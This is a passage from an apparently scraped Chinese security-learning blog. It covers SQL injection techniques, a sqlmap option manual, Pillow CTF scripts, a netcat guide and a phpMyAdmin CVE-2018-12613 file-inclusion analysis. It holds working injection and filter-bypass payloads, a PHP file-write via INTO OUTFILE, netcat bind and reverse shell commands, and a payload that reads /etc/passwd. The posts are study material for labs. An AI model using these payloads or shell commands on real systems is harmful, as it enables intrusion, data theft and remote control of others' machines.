，向这三个类型的注入更多的是配合报错提示进行注入参考文章：1https://www.cnblogs.com/babers/articles/7252401.html这个可以做一下sqli-labs第十七关的update注入 七.http头注入http头注入本质还是注入位置的不同在有些应用中http头的信息会回显到浏览器，这个时候可以尝试一下http头注入，注入利用的方式和get类型的一样我们来以sqli-labs第18关注入user-agent头为例：配合报错注入来进行注入： 八.数字型，字符型，搜索型注入像这三类注入，是包含上面所有的注入利用方式的，这三类注入个大方面，意思是用户输入到服务器的参数是数字，字符串，还是搜索数据的。所以这三类是整个sql注入大的方面，这里不在叙述。只对搜索型注入进行分析搜索型注入主要用在搜索数据时，对搜索的参数过滤不全。搜索型注入的构造和其他两类不太一样，一般的要加%，这是sql里的匹配查找我们来看一下一个靶场搜索型注入的代码：123456789101112131415161718192021if(isset($_GET['submit']) &amp;&amp; $_GET['name']!=null){ //这里没有做任何处理，直接拼到select里面去了 $name=$_GET['name']; //这里的变量是模糊匹配，需要考虑闭合 $query=&quot;select username,id,email from member where username like '%$name%'&quot;; $result=execute($link, $query); if(mysqli_num_rows($result)&gt;=1){ $html2.=&quot;&lt;p class='notice'&gt;用户名中含有{$_GET['name']}的结果如下：&lt;br /&gt;&quot;; while($data=mysqli_fetch_assoc($result)){ $uname=$data['username']; $id=$data['id']; $email=$data['email']; $html1.=&quot;&lt;p class='notice'&gt;username：{$uname}&lt;br /&gt;uid:{$id} &lt;br /&gt;email is: {$email}&lt;/p&gt;&quot;; } }else{ $html1.=&quot;&lt;p class='notice'&gt;0o。..没有搜索到你输入的信息！&lt;/p&gt;&quot;; }}我们可以看到输入的name 被’%name%’包围，这就是搜索型注入的构造方式构造的payload：1ko%' and updatexml(0x7e,concat(0x7e,version(),0x7e),0x7e) or '%这里只爆出数据库版本，其他的就不在这里操作了，思路都是一样，利用报错注入。 九.宽字节注入宽字节注入是一种特殊的注入方式，其利用的思路和前面写的一样，只不过宽字节注入能绕过将单引号等特殊字符转义。原因是：网站用了utf-8编码，而数据库使用了GBK编码宽字节（两字节）带来的安全问题主要是吃ASCII字符（一字节）的现象，使用一些特殊字符来”吃掉“经过转义符 “ \\ ” 。GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节mysql中用的转义函数：addslashes、mysql_real_escape_string、mysql_escape_string以及后面在高版本被去除的magic_quote_gpc以sqli第三十三关为例：发现可以运用宽字节注入，绕过防御措施。宽字节注入现在很少见了。这里只给出了爆当前数据库名的语句，其他的注入语句和上面写的报错注入一样。宽字节注入说白了就是绕过sql防御的一种收到，因为比较经典才会单拿出来提一下。 十.Mysql注入的高级利用这部分主要是如果我们的权限足够大，可以向网站写文件或读文件主要用到俩个语句：into outfile 和 load_file()11')) UNION SELECT 1,'&lt;?php echo &quot;Da4er&quot;?&gt;',3 into outfile 'D:\\1.txt' --+into outfile是向本地写文件的操作load_file()是读本地文件的操作 最后明天还会在写一篇sqlmap的使用教程，然后这个学期学安全的时间到此结束了，安心准备期末了~","link":"/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3.html"},{"title":"SQLMAP使用手册","text":"前言sqlmap是sql注入中使用的神器，也是渗透测试人员必须掌握的工具。因为最近在学习sql注入的专题，所以写下笔记来记录学习。 sqlmap使用选项1234-h, --help 显示基本帮助信息-hh 显示高级帮助信息--version 显示程序版本号-v VERBOSE 赘言级别：0-6(默认 1) 目标1234567-d DIRECT 直接连接到数据库-u URL, --url=URL 目标URL(e.g. &quot;www.target.com/vuln.php?id=1&quot;)-l LOGFILE 从Burp 或 WebScarab 日志中解析目标-m BULKFILE 在给定的文本文件中读取多个扫描目标-g GOOGLEDORK 将Google dork 结果作为目标URL-r REQUESTFILE 从文件中读取HTTP 请求-c CONFIGFILE 从INI 配置文件中读取配置选项 请求1234567891011121314151617181920212223242526272829303132--data=DATA 通过POST 方法提交的数据字符串--param-del=PDEL 用于分割参数值的字符--cookie=COOKIE HTTP Cookie 头--cookie-del=CDEL 用于分割cookie 值的字符--load-cookies=L.. 包含cookies 的Netscape/wget 格式文件--drop-set-cookie 忽略响应中的Set-Cookie 头--user-agent=AGENT HTTP User-Agent 头--random-agent 使用随机选择的HTTP User-Agent 头--host=HOST HTTP Host 头--referer=REFERER HTTP Referer 头--headers=HEADERS Extra 头(e.g. &quot;Accept-Language: fr\\nETag: 123&quot;)--auth-type=AUTH.. HTTP 认证方式(Basic, Digest, NTLM 或 PKI)--auth-cred=AUTH.. HTTP 认证证书(name:password)--auth-private=A.. HTTP 认证PEM 私钥文件--proxy=PROXY 使用代理连接目标URL--proxy-cred=PRO.. 代理认证证书(name:password)--proxy-file=PRO.. 从文件读取代理列表--ignore-proxy 接受系统默认代理设置--tor 使用Tor 匿名网络--tor-port=TORPORT 设置默认以外的Tor 代理端口--tor-type=TORTYPE 设置 Tor 代理方式(HTTP( 默认), SOCKS4 或SOCKS5)--check-tor 检查Tor 是否正确使用--delay=DELAY 每个HTTP 请求之间延迟的秒数--timeout=TIMEOUT 认定连接超时的秒数(默认 30)--retries=RETRIES 超时重试的次数(默认 3)--randomize=RPARAM 随机改变给定参数的值--safe-url=SAFURL 设置一个安全链接供系统经常访问--safe-freq=SAFREQ 设置一个安全连接供系统在两次测试之间访问--skip-urlencode 不对攻击载荷数据进行URL 编码--force-ssl 强制使用SSL/HTTPS--hpp 使用HTTP 参数污染--eval=EVALCODE 供提交请求之前评估参数的 Python 代码(e.g. &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;) 优化12345-o 开启所有优化开关--predict-output 预测常见的查询输出--keep-alive 使用持久的HTTP(s)连接--null-connection 检索HTTP 响应长度不实际的页面--threads=THREADS 并发HTTP(s)请求的最大数量(默认 1) 注入12345678910111213-p TESTPARAMETER 测试参数--skip=SKIP 跳过对给定参数的测试--dbms=DBMS 在这里强制指定后端DBMS--dbms-cred=DBMS.. DBMS 认证证书(user:password)--os=OS 在这里强制后端DBMS 操作系统--invalid-bignum 使用大数字无效化值--invalid-logical 使用逻辑运算无效化值--invalid-string 使用随机字符串无效化值--no-cast 关闭攻击载荷铸造机制--no-escape 关闭字符串逃逸机制--prefix=PREFIX 注入攻击载荷前缀字符串--suffix=SUFFIX 注入攻击载荷后缀字符串--tamper=TAMPER 使用给定的脚本篡改注入数据 检测12345678--level=LEVEL 执行测试的等级(1-5, 默认 1)--risk=RISK 执行测试的风险(0-3, 默认 1)--string=STRING 查询被评估为True 时的匹配字符串--not-string=NOT.. 查询被评估为False 时的匹配字符串--regexp=REGEXP 查询被评估为True 时的正则表达式--code=CODE 查询被评估为True 时的HTTP 代码--text-only 仅基于文本内容比较网页--titles 仅基于标题比较网页 技术1234567--technique=TECH 使用的SQL 注入技术(默认使用所有技术)--time-sec=TIMESEC DBMS 响应的延迟秒数(默认 5)--union-cols=UCOLS UNION 查询注入测试字段的范围--union-char=UCHAR 暴破字段数量使用的字符--union-from=UFROM UNION 查询注入FROM 部分使用的数据表--dns-domain=DNS.. DNS 溢出攻击所使用的域名--second-order=S.. 二阶响应页面URL 指纹1-f, --fingerprint 检查 DBMS 版本指纹 枚举123456789101112131415161718192021222324252627282930313233-a, --all 检索一切-b, --banner 检索DBMS banner 信息--current-user 检索DBMS 当前用户--current-db 检索DBMS 当前数据库--hostname 检索DBMS 服务器主机名--is-dba 检测当前用户是否是DBA--users 枚举DBMS 用户名--passwords 枚举DBMS 用户密码哈希--privileges 枚举DBMS 用户权限--roles 枚举DBMS 用户角色--dbs 枚举DBMS 数据库--tables 枚举DBMS 数据库表--columns 枚举DBMS 数据库表字段--schema 枚举DBMS 架构--count 检索数据表中的条目数--dump 转储DBMS 数据库表中的条目--dump-all 转储所有DBMS 数据库表中的条目--search 搜索字段名, 表名和(或)库名--comments 检索DBMS 注释-D DB DBMS 数据库-T TBL DBMS 数据库表-C COL DBMS 数据库表字段-X EXCLUDECOL 不枚举DBMS 数据库表字段-U USER DBMS 用户--exclude-sysdbs 枚举数据库表时排除DBMS 系统库--where=DUMPWHERE 转储数据表时使用WHERE 条件--start=LIMITSTART 第一个查询的输出项检索--stop=LIMITSTOP 最后一个查询的输出项检索--first=FIRSTCHAR 第一个查询的输出字的字符检索--last=LASTCHAR 最后一个查询的输出字的字符检索--sql-query=QUERY 要执行的SQL 语句--sql-shell 返回交互式的SQL shell--sql-file=SQLFILE 从给定的文件执行SQL 语句 强制爆破1234--common-tables 检查是否存在常见表--common-columns 检查是否存在常见字段用户定义函数注入：--udf-inject 注入用户自定义函数--shared-lib=SHLIB 共享库的本地路径 文件系统访问123--file-read=RFILE 从后端DBMS 文件系统读取文件--file-write=WFILE 向后端DBMS 文件系统写入本地文件--file-dest=DFILE 向后端DBMS 文件系统写入文件的绝对路径 操作系统访问12345678--os-cmd=OSCMD 执行操作系统命令--os-shell 返回交互式的操作系统shell--os-pwn 返回OOB shell, meterpreter 或VNC--os-smbrelay 一键返回OOB shell, meterpreter 或VNC--os-bof 存储过程缓冲区溢出利用--priv-esc 数据库进程用户权限提升--msf-path=MSFPATH 已安装的Metasploit Framework 本地路径--tmp-path=TMPPATH 远程临时文件目录的绝对路径 Windows注册表访问1234567--reg-read 读取一个Windows 注册表键值--reg-add 写入一个Windows 注册表键值--reg-del 删除一个Windows 注册表键值--reg-key=REGKEY Windows 注册表键--reg-value=REGVAL Windows 注册表键值--reg-data=REGDATA Windows 注册表键值数据--reg-type=REGTYPE Windows 注册表键值类型 常规12345678910111213141516171819202122232425262728-s SESSIONFILE 从存储(.sqlite)文件中读取会话-t TRAFFICFILE 记录所有HTTP 流量为一个文本文件--batch 从不询问用户输入, 使用默认行为--charset=CHARSET 强制数据检索使用的字符编码--crawl=CRAWLDEPTH 从目标URL 抓取起始网页--csv-del=CSVDEL CSV 输出中使用的定界符(默认&quot;,&quot;)--dump-format=DU.. 转储数据的格式(CSV(默认), 可以设置为HTML或SQLITE)--eta 显示每个输出的预计到达时间--flush-session 刷新当前目标的会话文件--forms 分析并测试目标URL 中的表单--fresh-queries 忽略在会话文件中存储的查询结果--hex 对数据检索使用DBMS 的hex 函数--output-dir=OUT.. 自定义输出目录路径--parse-errors 从响应中分析并显示DBMS 错误消息--pivot-column=P.. 透视字段--save 保存选项到INI 配置文件--scope=SCOPE 用正则表达式从所提供的代理日志过滤目标--test-filter=TE.. 通过攻击载荷和(或)标题选择测试(e.g. ROW)--update 更新sqlmap 杂项123456789101112131415-z MNEMONICS 使用短记忆法(e.g. &quot;flu,bat,ban,tec=EU&quot;)--alert=ALERT 当找到 SQL 注入时运行操作系统命令--answers=ANSWERS 设置问题的答案(e.g. &quot;quit=N,follow=N&quot;)--beep 当找到SQL 注入时发出蜂鸣--check-waf 启发式检查 WAF/IPS/IDS 保护--cleanup 从sqlmap 具体UDF 和表清理DBMS--dependencies 检查是否缺少(非核心)的sqlmap 的依赖--disable-coloring 禁用控制台输出着色--gpage=GOOGLEPAGE 从指定页码使用Google dork 结果--identify-waf 使测试通过 WAF/IPS/IDS 保护--mobile 通过HTTP User-Agent 头模拟智能手机--page-rank 为Google dork 结果显示网页排名(PR)--purge-output 从输出目录中安全删除所有内容--smart 仅通过积极的启发式进行测试--wizard 用于初级用户的简单向导接口 参考：sqlmap参考手册 结束对于sqlmap的学习，其实不用死记硬背其中的参数，用到的时候查就行。这学期学安全的时间到此结束了，开始准备期末了，寒假再见了~~","link":"/SQLMAP%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C.html"},{"title":"Python Pillow库学习","text":"一.安装pillow很简单直接:pip install pillow导入的时候python2和python3略有不同//python2import Image//python3(因为是派生的PIL库，所以要导入PIL中的Image)from PIL import Image 二.基本操作1.图片的打开和展示123from PIL import Imageim=Image.open(&quot;haha.jpg&quot;)im.show() open()打开图片show()展示图片 2.图片格式,宽高,模式123from PIL import Imageim=Image.open(&quot;haha.jpg&quot;)print(im.format,im.size,im.mode) format展示图像的格式(jpg,png等等)size属性是一个tuple,表示图像的宽和高mode表示图像的模式(RGB) 3.图片保存123from PIL import Imageim=Image.open(&quot;haha.jpg&quot;)im.save(&quot;/root/haha1.jpg&quot;) save()保存图片 4.convert()convert() 是图像实例对象的一个方法，接受一个 mode 参数，用以指定一种色彩模式，mode 的取值可以是如下几种：· 1 (1-bit pixels, black and white, stored with one pixel per byte)· L (8-bit pixels, black and white)· P (8-bit pixels, mapped to any other mode using a colour palette)· RGB (3x8-bit pixels, true colour)· RGBA (4x8-bit pixels, true colour with transparency mask)· CMYK (4x8-bit pixels, colour separation)· YCbCr (3x8-bit pixels, colour video format)· I (32-bit signed integer pixels)· F (32-bit floating point pixels)123from PIL import Imageim=Image.open(&quot;haha.jpg&quot;).convert('L')im.show() 123from PIL import Imageim=Image.open(&quot;haha.jpg&quot;).convert('RGB&quot;)im.show() 5.filter()用filter()需要导入PIL库中的ImageFilter模块123456789101112131415161718192021from PIL import Image, ImageFilterim = Image.open(‘1.png')# 高斯模糊im.filter(ImageFilter.GaussianBlur)# 普通模糊im.filter(ImageFilter.BLUR)# 边缘增强im.filter(ImageFilter.EDGE_ENHANCE)# 找到边缘im.filter(ImageFilter.FIND_EDGES)# 浮雕im.filter(ImageFilter.EMBOSS)# 轮廓im.filter(ImageFilter.CONTOUR)# 锐化im.filter(ImageFilter.SHARPEN)# 平滑im.filter(ImageFilter.SMOOTH)# 细节im.filter(ImageFilter.DETAIL) 6.获取图片尺寸,缩放图片1234567from PIL import Imageim=Image.open(&quot;haha.jpg&quot;)w,h=im.sizeprint(w,h)im.thumbnail((w//2,h//2))#im=im.resize((217,154))print(&quot;Resize image to:%s %s&quot;%(w//2,h//2)) 7.截屏123from PIL import ImageGrabim=ImageGrab.grab((0,0,800,200))#截取屏幕指定区域的图像im=ImageGrab.grab()#全屏截屏 8.羽化1234from PIL import Image,ImageFilterim=Image.open(&quot;haha.jpg&quot;)im2=im.filter(ImageFilter.BLUR)im2.save('1.jpg','jpeg) 9.颜色与RGBA值传统的图片模式是RGB 即红绿蓝 ；RGBA是红绿蓝加上alpha(透明度)。RGBA的值表示为由4个整数组成的元组，分别R,G,B,A整数的范围0~255，RGB全0表示黑色，全255表示黑色。那么猜测(0,128,0,255)是绿色，因为G分量最大，R、B分量都是0，所以呈现出来是绿色。但是当alpha值为0时，无论什么颜色，该颜色都是不可见的。123from PIL import ImageColorprint(ImageColor.getcolor('green','RGBA'))print(ImageColor.getcolor('black','RGB')) 10.图像的坐标表示图像中左上角是坐标原点(0,0),这和平常数学里的坐标系不太一样。这样定义的坐标意味着，X轴是从左到右增长的，而Y轴是从上到下增长。在Pillow中如何使用上述定义的坐标系表示一块矩形区域?许多函数或方法要求提供一个矩形元组参数。元组参数包含四个值，分别代表矩形四条边的距离X轴或者Y轴的距离。顺序是(左，顶，右，底)。右和底坐标稍微特殊，表示直到但不包括。比如(3,2,8,9)就表示横坐标[3,7];纵坐标[2,8]的矩形区域。 11.新建图像(new())new()有三个参数 第一个参数是mode即颜色空间模式，第二个参数指定了图像的分辨率(宽×高)，第三个参数是颜色(可以省略)第三个参数颜色:可以直接填入常用颜色名称(red,green,blue);也可以填入十六进制表示的颜色，如#FF0000表示红色；还能传入元组，如(255,0,0,255)表示红色 12.更改单个像素点(putpixel())getpixel() 获取单个像素点的RGB或者RGBA值putpixel()在单个像素点上添加RGB或者RGBA值123456789from PIL import ImageColor,Imageim=Image.new('RGB',(200,200))print(im.getpixel((0,0)))for i in range(200): for j in range(100): im.putpixel((i,j),(210,210,210)) for z in range(100,200): im.putpixel((i,z),(255,0,0))im.save(&quot;4.png&quot;) 13.图片的剪贴，黏贴(1)图片的剪贴12345from PIL import Imageim=Image.open(&quot;haha.jpg&quot;)box=(100,100,450,300)region=im.crop(box)region.show() box这是一个4元的坐标数组,坐标轴是左上角是(0,0)的卡迪尔坐标系。box(x1,y1,x2,y2) (2)图片的黏贴paste() 图片黏贴方法paste(要贴的图片，要贴的图片的4元坐标组成的区域)1234567from PIL import Imageim=Image.open(&quot;haha.jpg&quot;)box=(50,50,200,200)region=im.crop(box)#region=region.transpose(Image.ROTATE_180)im.paste(region,box)im.show() 14.调整图像大小resize((x,y)) 将图片改成宽为x，高为y的图片123456from PIL import Imageim=Image.open('haha.jpg')width,height=im.size#print(width,height)resizeim=im.resize((width,height+10))resizeim.show() 15.旋转和翻转图像12345from PIL import Imageim=Image.open('haha.jpg')im.rotate(90).show()im.rotate(270).show()im.rotate(180).show() 处理GIF等序列文件使用seek和tell方法可以在不同帧移动，tell是帧数，而seek是取当前帧数的图片。12345from PIL import Imageim=Image.open('1.gif')while 1: im.seek(im.tell()+1) im.show() 三.常用脚本1.LSBLSB最低位隐写 就是把隐藏的信息放到每个像素的最低位 LSB是将原本的像素转8位2进制，将8位2进制的左后一位置0或者置1来隐写数据，所以我们可以枚举所有像素，当该位像素最后一位不为0时，置为255的黑点。1234567891011from PIL import Imageimg=Image.open('01.png')width,height=img.sizefor i in range(0,width): for j in range(0,height): tmp=img.getpixel((i,j)) if tmp&amp;0x1==0: img.putpixel((i,j),0) else: img.putpixel((i,j),255)img.show() 2.RGB画图1234567891011121314151617from PIL import Imagex = 280 #x坐标 通过对txt里的行数进行整数分解y = 280 #y坐标 x * y = 行数im = Image.new(&quot;RGB&quot;, (x, y)) #创建图片file = open('flag.txt') #打开rbg值的文件#通过每个rgb点生成图片for i in range(0, x): for j in range(0, y): line = file.readline() #获取一行的rgb值 rgb = line.split(&quot;, &quot;) #分离rgb，文本中逗号后面有空格 im.putpixel((i, j), (int(rgb[0]), int(rgb[1]), int(rgb[2]))) #将rgb转化为像素im.show() 3.图片去污垢1234567891011121314151617181920212223from PIL import Imagelena = Image.open('1.png')pixsels = lena.load()width=lena.size[0]height=lena.size[1]list1=[]for x in range(0,width): for y in range(0,height): r,g,b=pixsels[x,y] if r==255 and g==255: pass else: if int(bin(b)[-1])==1: list1.append(0) else: list1.append(1)print (len(list1))im=Image.new(&quot;1&quot;,(300,300))i=0while i&lt;len(list1): im.putpixel((i%300,i/300),list1[i]) i=i+1im.save(&quot;2.png&quot;) 4.方向建画图12345678910111213141516171819202122232425262728293031323334from PIL import ImageMAX=1000pic=Image.new(&quot;RGB&quot;,(MAX,MAX))str=&quot;DDDDDDDDDRRRRRRDDDDDDDDDDDDDDDDLLLDDDDDDDDDDDLLRRRRLLDDDDDDDDDDDDDDDDDDDDDDDDUUUUUUUUUUUUUUUUUUUURRRRRRRUUUUUUUUUUUUUUUDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDUUUUUUUUUUUUUUUUUUUURRRRRRRRUUUUUUUUUUULLLLLRRRRRRLDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLUUUUUUUUUUUUUURRRRUUUUURRRRRUUUUUUUUUUURRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLUUUUUUUUUUUUUUUUUUUDDDDDDDDDDDDDDDDDDDRRRRRRLDDDDDDDDDDDDDLLLLLLLRRRRRRRRLUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUURRRRRUUUUUUUUUUUUUUUUURRLLDDDDDDDDDDDDDDDDDDDDDDLLDDDDRRDDDDDDDDDDDDDDDDDDDDDDDRRLLUUUUUUUUUUUUUUUUUUUUUUULLUUUURRUUUUURRRRRRRRUUUUUUUUUUULLLLLRRRRRRLDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLUUUUUUUUUUUUUURRRRUUUUURRRRDDDDDDDDDDDDDDDDDDDDDDRRRRRLLLLLUUUUUUUUUUUUUUUUUUUUUURRRRRUUUUUUUUUUUUUUUULLLLLRRRRRDDDDDDDDDDDDDDDDRRRUUUUUUUUUUUUUUUURRRRLLLLDDDDDDDDDDDDDDDDRRRRDDDDDDDDDDDDDDDDDDDDDDLLLLRRRRUUUUUUUUUUUUUUUUUUUUUURRRRRUUUUUUUUUUUUUUUURRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLUUUUUUUUUUUUUUUUUUUUUURRRRRRRRRRRRUUUUUUUUUUUUUUUULLLLLRRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLRRRRRUUUUUUUUUUUUUUUUUUUUUURRRRRRRUUUUUUUUUUUUUUUULLLLLRRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLRRRRRUUUUUUUUUUUUUUUUUUUUUURRUUUUUUUUUUUUUUUURRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLUUUUUUUUUUUUUUUUUUUUUURRRRRRRRRRUUUUUUUUUUUUUUUUUUUUULLLRRRDDDDDDDDDDDDDDDDDDDDDDDDRRDDDDLLDDDDDDDDDDDDDDDDDDDDLLL&quot;flagx=10flagy=50for y in range(0,MAX): for x in range(0,MAX): pic.putpixel([x,y],(255,255,255))for key in str: if key==&quot;R&quot;: for x in range(0,5): pic.putpixel([flagx+x,flagy],(0,0,0)) flagx=flagx+5 if key==&quot;D&quot;: for x in range(0,5): pic.putpixel([flagx,flagy+x],(0,0,0)) flagy+=5 if key==&quot;L&quot;: for x in range(0,5): pic.putpixel([flagx-x,flagy],(0,0,0)) flagx-=5 if key==&quot;U&quot;: for x in range(0,5): pic.putpixel([flagx,flagy-x],(0,0,0)) flagy-=5pic.show()pic.save(&quot;flag.png&quot;) 当然常用脚本不只这些 python对图片处理有着强大的功能，还需不断学习。 第二篇文章了，不知道有没有人看，希望自己坚持下去！！","link":"/Python-Pillow%E5%BA%93%E5%AD%A6%E4%B9%A0.html"},{"title":"SQL注入Fuzz记录","text":"前言从今天开始学习各种fuzz测试，今天做了一道sql注入题，通过fuzz来判断过滤字符，从而构造payload进行绕过。 正文拿到题目进行简单的测试发现这题进行了一些sql关键字的过滤，我们通过burp的Intruder模块进行fuzz。字段长度为370的是被过滤的sql语句。进一步分析看看这题目到底过滤了哪些关键字，通过一个个分析知道过滤了：# –+等注释符，空格，%0a,%0b等绕过过滤空格的url编码，逗号(,)，包含and和or的字符。还有很多绕过过滤的关键字，发现没有过滤sleep()，尝试一下时间盲注。常规的时间盲注为：1if(条件,sleep(3),2)但是题目过滤了逗号，想到用case when替换：1case when 条件 then sleep(2) else 1 end但是过滤了空格等分隔符，同时内联注释 注释符 %0a %0b %0d %a0也多被过滤，我们可以用括号来代替空格：1case when(条件)then(sleep(2))else(1)end但是测试发现case和when中间是不能添加括号的，到这里时间盲注也是不可行的。 可以尝试另类的布尔盲注:1select 'admin'='admin'+1 union select 'admin'='admin'+0;在本地测试发现，第一个输出0，第二个输出1。这是mysql的一个特性：在第一个查询中，先进行右边的’admin’+1操作，这个时候会强制转换admin为数字，然后相加完在和等号左边的admin比较，这个时候也会强制转换，所以就会形成不相等的情况。上面就可以形成布尔逻辑判断了。首先我们可以先判断一些admin账号的密码长度1admin'%2b(length(passwd)=32)%2b'%2b是+号，不能直接使用加号因为被过滤了，这里也可以使用-号，效果相同。上面的逻辑是：如果passwd长度为32，则返回1，然后和admin作相加操作，这样就会形成逻辑上的差别。如下图：这样就可以判断admin的密码是个32为的md5值。然后在猜解每个字符，通过mid函数进行：但for被过滤！mid(xxx from 1) 第一位开始取剩下的所有字符ascii(mid(xxx from 1)) 发现截断 取第一个字符的ascii值。payload：1admin'%2b(ascii(mid((passwd)from(1)))=48)%2b'通过括号绕过空格过滤，通过mysql中的mid，ascii函数特性绕过for过滤。最后通过burp爆破每一位的ascii值，就可以得到密码的md5值了。","link":"/SQL%E6%B3%A8%E5%85%A5Fuzz%E8%AE%B0%E5%BD%95.html"},{"title":"SQL注入Trick(持续更新.....)","text":"Hey, password is required here. ","link":"/SQL%E6%B3%A8%E5%85%A5Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html"},{"title":"nc详解","text":"一.简介Nc全名为Netcat，网络工具中的瑞士军刀。主要功能为：1.侦听模式/传输模式2.telnet/获取banner信息3.传输文本信息4.传输文件/目录5.加密传输文件6.远程控制/木马7.加密所有流量8.流媒体服务器9.远程克隆硬盘123456789101112131415161718-h 查看帮助信息-d 后台模式-g gateway source-routing hop point[s], up to 8-G num source-routing pointer: 4, 8, 12, …-e prog程序重定向，一但连接就执行［危险］-i secs延时的间隔-l 监听模式，用于入站连接-L 监听模式，连接天闭后仍然继续监听，直到CTR+C-n IP地址，不能用域名(不使用DNS反向查询IP地址的域名)-o film记录16进制的传输-p[空格]端口 本地端口号-s addr 本地源地址-r 随机本地及远程端口-t 使用Telnet交互方式-u UDP模式-v 详细输出，用-vv将更详细-w 数字 timeout延时间隔-z 将输入，输出关掉（用于扫锚时） 二.telnet/获取banner信息-n 参数：只接收ip，没有dns解析-v 参数：返回详细信息我们先来解析一下要连接的ip地址：用nc -nv 连接目标的80端口 三.传输文本信息-l：设置为监听模式-p：指定一个开放的端口用-l -p参数将目标设置为服务器，并开放一个端口等待连接我们可以用nc进行聊天： 四.传输文件或目录Nc可以当作一个文件传输服务器，传输文件到目标机器。传输可分为正向传输和反向传输。正向传输：12nc -lp 444&lt;1.pync -nv 1.1.1.1 444 &gt;2.py 反向传输：12nc -lp 444&gt;1.pync -nv 1.1.1.1 444&lt;1.py 五.Nc端口扫描nc -nvz 开启端口扫描 默认扫描tcp端口nc -nvzu 扫描udp端口12nc -nvz 1.1.1.1 1-65535nc -nvzu 1.1.1.1 1-1024 六.远程控制正向控制：12nc -lp port -c bash/cmdnc -nv ip意思是服务器开放一个端口，当客户端连接时直接获取shell，这样在客户端就能执行服务器的命令 反向控制：12nc -ip portnc -nv ip -c bash/cmd意思是服务器开放一个端口，当客户端连接时直接将自己的shell给服务器端，在服务器端执行客户端命令 好久没更新了，因为最近一直按专题学习常见的漏洞，也没啥好写的，最近在学习sql注入，等写完了再一块发出来吧~","link":"/nc%E8%AF%A6%E8%A7%A3.html"},{"title":"代码审计_phpmyadmin4.8.1后台文件包含漏洞(CVE-2018-12613)","text":"漏洞影响范围：phpmyadmin4.8.0 4.8.1漏洞类型：后台任意文件包含下载地址 漏洞出现在index.php页面中的55~63行123456789if (! empty($_REQUEST['target']) &amp;&amp; is_string($_REQUEST['target']) &amp;&amp; ! preg_match('/^index/', $_REQUEST['target']) &amp;&amp; ! in_array($_REQUEST['target'], $target_blacklist) &amp;&amp; Core::checkPageValidity($_REQUEST['target'])) { include $_REQUEST['target']; exit;}看这个段代码的逻辑：传入的target参数不为空；target是字符串类型；target不易index开头；target不在$target_blacklist中；checkPageValidity($_REQUEST[‘target’]返回true。 看一下$target_blacklist：123$target_blacklist = array ( 'import.php', 'export.php');追踪一下checkPageValidity函数：在/libraries/classes/Core.php中找到，代码如下：1234567891011121314151617181920212223242526272829303132public static function checkPageValidity(&amp;$page, array $whitelist = []) { if (empty($whitelist)) { $whitelist = self::$goto_whitelist; } if (! isset($page) || !is_string($page)) { return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } return false; }看见这个函数需要两个参数，如果whitelist参数为空，会使用代码提供的白名单数组，追踪一下这个数组：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950public static $goto_whitelist = array( ' db_datadict.php', 'db_sql.php', 'db_events.php', 'db_export.php', 'db_importdocsql.php', 'db_multi_table_query.php', 'db_structure.php', 'db_import.php', 'db_operations.php', 'db_search.php', 'db_routines.php', 'export.php', 'import.php', 'index.php', 'pdf_pages.php', 'pdf_schema.php', 'server_binlog.php', 'server_collations.php', 'server_databases.php', 'server_engines.php', 'server_export.php', 'server_import.php', 'server_privileges.php', 'server_sql.php', 'server_status.php', 'server_status_advisor.php', 'server_status_monitor.php', 'server_status_queries.php', 'server_status_variables.php', 'server_variables.php', 'sql.php', 'tbl_addfield.php', 'tbl_change.php', 'tbl_create.php', 'tbl_import.php', 'tbl_indexes.php', 'tbl_sql.php', 'tbl_export.php', 'tbl_operations.php', 'tbl_structure.php', 'tbl_relation.php', 'tbl_replace.php', 'tbl_row_action.php', 'tbl_select.php', 'tbl_zoom_select.php', 'transformation_overview.php', 'transformation_wrapper.php', 'user_password.php', );看一下这段代码的逻辑：就是target参数问号前面的要在白名单里会返回true。看一下这段代码：1234567891011 $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } return false; }这段代码是将参数url解码一下，所以在浏览器中我们要双重url编码，因为在传入服务器之前会先进行一次url解码。根据我们上面的分析很容易写出payload:12http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd我试了不url编码?的payload，但是没有成功。最后直接通过这段payload获取到了我事先写好的一个flag.txt文件内容：","link":"/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-phpmyadmin4-8-1%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2018-12613.html"},{"title":"SQL注入绕过笔记(一)","text":"0x01 数据库特性注释常见的注释符号：1#，--空格，-- -，--+，//，/**/，/*任意字符串*/，;一般是使用//来绕过过滤空格。12select * from users where id=1;select/**/*/**/from/**/users/*111*/where/**/id=1;上面两条语句执行结果是一样的。需要注意的是：虽然#，–空格 – - –+都是注释符，但是在不同网站对它们的解析不同。这个时候就需要我们多加测试，看看哪种注释符可以被网站的数据库解析执行。这里来了个知识点：怎么绕过过滤空格加注释符的sql注入？payload：1'/**/union/**/select/**/1,2,3,4/**/or/**/'1'='1我们可以使用// 块注释或者一些url编码的特殊字符(%09,%0a,%0b,%0c,%0d,%20,%a0 )来替换空格，用or 